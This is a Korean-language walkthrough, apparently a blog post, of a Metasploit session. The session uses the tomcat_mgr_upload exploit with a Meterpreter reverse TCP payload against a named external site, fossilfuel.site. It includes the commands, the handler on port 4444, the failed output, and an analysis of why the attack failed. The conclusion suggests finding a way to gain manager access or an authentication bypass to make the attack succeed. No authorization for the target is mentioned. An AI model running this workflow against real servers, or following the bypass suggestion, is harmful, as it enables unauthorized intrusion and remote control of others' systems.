# Metasploit 해킹 시도 분석

## Metasploit 버전 및 기능

       =[ metasploit v6.4.18-dev                          ]
+ -- --=[ 2437 exploits - 1255 auxiliary - 429 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/
```

- **Metasploit 버전**: 현재 사용하는 Metasploit 버전은 `6.4.18-dev`입니다.
- **Metasploit의 주요 기능**:
  - `2437`개의 **익스플로잇** (취약점 공격 모듈)
  - `1255`개의 **보조 모듈** (보조 작업을 위한 모듈)
  - `429`개의 **포스트 모듈** (공격 후 작업)
  - `1468`개의 **페이로드** (공격 후 실행할 코드)
  - `47`개의 **인코더** (페이로드 변환 도구)
  - `9`개의 **회피 모듈** (보안 시스템 회피 도구)

Metasploit을 활용한 해킹 시도는 다양한 공격 모듈과 도구를 통해 이루어집니다.

## 1. Exploit 모듈 선택

```
msf6 > use exploit/multi/http/tomcat_mgr_upload
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
```

- **Exploit 모듈 선택**: `tomcat_mgr_upload` 모듈을 사용했습니다. 이 모듈은 Tomcat 웹 서버의 관리자 페이지에 취약점이 있을 때 사용되는 업로드 취약점을 이용합니다.
- **페이로드**: 페이로드가 설정되지 않아서 `java/meterpreter/reverse_tcp`로 기본 설정되었습니다. 이 페이로드는 원격에서 제어할 수 있는 쉘을 얻게 됩니다.

## 2. RHOST 설정

```
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOST http://fossilfuel.site/
RHOST => http://fossilfuel.site/
```

- **RHOST 설정**: 공격할 대상 서버의 주소를 `http://fossilfuel.site/`로 설정했습니다. 이 주소는 공격자가 타겟으로 삼는 서버입니다.

## 3. 공격 시도

```
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit

[*] Started reverse TCP handler on 192.168.10.128:4444
[*] Retrieving session ID and CSRF token...
[-] Exploit aborted due to failure: unknown: Unable to access the Tomcat Manager
[*] Exploit completed, but no session was created.
```

- **공격 시도**: `exploit` 명령어를 입력하여 공격을 실행했습니다.
  - **Reverse TCP 핸들러 시작**: `192.168.10.128:4444`에서 리버스 TCP 핸들러가 시작되었으며, 공격자가 리버스 쉘을 받을 준비가 되었습니다.
  - **세션 ID와 CSRF 토큰 가져오기**: Tomcat 관리자 페이지의 세션 ID와 CSRF 토큰을 가져오려고 했습니다.
  - **실패**: `Unable to access the Tomcat Manager`라는 오류가 발생했습니다. 이는 Tomcat 관리자 페이지에 접근할 수 없음을 의미합니다. 인증 문제일 수 있으며, 관리자 페이지가 외부에서 접근 불가능하도록 설정되어 있을 가능성도 있습니다.
  - **공격 종료**: `Exploit completed, but no session was created.` 공격은 종료되었고, 성공적인 세션 연결은 이루어지지 않았습니다.

## 4. 공격 실패 분석

- **Tomcat 관리자 접근 실패**: 이 오류 메시지는 공격자가 타겟 서버의 Tomcat 관리자 페이지에 접근할 수 없음을 의미합니다. 원인은 여러 가지일 수 있습니다:
  - **인증 문제**: Tomcat 관리 페이지에 로그인해야 하는 경우, 올바른 자격 증명이 제공되지 않은 상태에서 공격이 시도되었을 수 있습니다.
  - **IP 접근 제한**: Tomcat 관리자 페이지는 특정 IP에서만 접근할 수 있도록 제한될 수 있습니다.
  - **서버 방화벽 또는 보안 설정**: 서버의 보안 설정이 강화되어 외부에서의 접속을 차단했을 가능성도 있습니다.

## 결론

- **공격이 실패한 이유**는 `Tomcat Manager`에 접근할 수 없었기 때문입니다. 따라서 취약점 공격이 제대로 실행되지 않았습니다. 만약 이 취약점을 이용하고자 한다면, 관리자 페이지에 대한 접근을 허용하는 방법을 찾거나, 인증 우회 방법을 적용해야 할 필요가 있습니다.
```

